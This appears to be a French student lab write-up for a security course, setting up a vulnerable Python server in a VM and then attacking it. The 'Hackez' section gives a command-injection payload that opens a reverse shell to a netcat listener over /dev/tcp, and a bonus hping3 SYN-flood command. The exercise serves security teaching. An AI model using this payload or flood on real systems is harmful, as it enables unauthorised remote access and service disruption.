# I. Partie 1 : Host & Hack

## Sommaire

- [I. Partie 1 : Host \& Hack](#i-partie-1--host--hack)
  - [Sommaire](#sommaire)
  - [1. A vos marques](#1-a-vos-marques)
  - [2. Prêts](#2-prêts)
  - [3. Hackez](#3-hackez)

## 1. A vos marques

🌞 **Télécharger l'application depuis votre VM**

```bash
[toto@rocky ~]$ wget https://gitlab.com/it4lik/b3-csec-2024/-/raw/main/efrei_server
```

🌞 **Lancer l'application `efrei_server`**

```bash
[toto@rocky ~]$ python main.py 
```

```bash
[toto@rocky ~]$ export LISTEN_ADDRESS=172.16.74.175
```

🌞 **Prouvez que l'application écoute sur l'IP que vous avez spécifiée**

```bash
[toto@rocky ~]$ sudo ss -ltnp
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process                                 
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*           users:(("sshd",pid=843,fd=3))          
LISTEN       0            100                172.16.74.175:8888                   0.0.0.0:*           users:(("python",pid=5522,fd=6))
```

## 2. Prêts

🌞 **Se connecter à l'application depuis votre PC**

```bash
nc 172.16.74.175 8888 
```

## 3. Hackez

🌞 **Euh bah... hackez l'application !**

*Dans un premier shell*
```bash
nc -nvl 8080
```

*Dans un second shell*

```bash
❯ nc 172.16.74.175 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) : 4
Exécuter la commande ls vers le dossier : ; sh -i >& /dev/tcp/172.16.74.1/8080 0>&1
```

🌟 **BONUS : DOS l'application**

```bash
sudo hping3 --flood -p 8888 -S 172.16.74.175
```

> ➜ [**Lien vers la partie 2**](./part2.md)